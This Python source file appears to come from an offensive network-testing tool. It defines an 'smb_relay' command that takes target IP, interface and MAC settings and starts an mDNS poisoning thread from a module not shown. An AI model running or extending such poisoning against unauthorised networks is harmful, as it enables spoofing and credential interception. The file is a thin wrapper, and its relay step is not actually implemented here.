from cmd2.command_definition import with_default_category
from .Poison.poisoners import MDNS
from cmd2 import CommandSet, with_default_category, Cmd2ArgumentParser, with_argparser
import threading
import argparse


@with_default_category("Relay Attacks")
class SmbRelay(CommandSet):
    def __init__(self) -> None:
        super().__init__()

    argParser = Cmd2ArgumentParser(
        description="""Tool to perform the smb_relay attack attack"""
    )
    argParser.add_argument(
        "-SS",
        "--show_settable",
        action="store_true",
        help="Show Settable variables for this command",
    )

    @with_argparser(argParser)
    def do_smb_relay(self, args: argparse.Namespace) -> None:
        mdns_poisoner = MDNS(
            self._cmd.IP_TARGET,
            self._cmd.IPV6_TARGET,
            self._cmd.MAC_ADDRESS,
            self._cmd.INTERFACE,
        )
        self._cmd.logger.info(
            f"""Starting smb relay attack using ip: {self._cmd.IP_TARGET} ipv6: 
            {self._cmd.IPV6_TARGET} interface: {self._cmd.INTERFACE} mac_address: 
            {self._cmd.MAC_ADDRESS}"""
        )

        settable_variables_required = {
            "IP_TARGET": self._cmd.IP_TARGET,
            "IPV6_TARGET": self._cmd.IPV6_TARGET,
            "INTERFACE": self._cmd.INTERFACE,
            "MAC_ADDRESS": self._cmd.MAC_ADDRESS,
        }
        if args.show_settable:
            self._cmd.show_settable_variables_necessary(settable_variables_required)
        elif self._cmd.check_settable_variables_value(settable_variables_required):
            try:
                mdns_thread = threading.Thread(
                    target=mdns_poisoner.start_mdns_poisoning
                )
                mdns_thread.daemon = True
                mdns_thread.start()
                mdns_thread.join()
            except KeyboardInterrupt:
                self._cmd.warning("Exiting...")
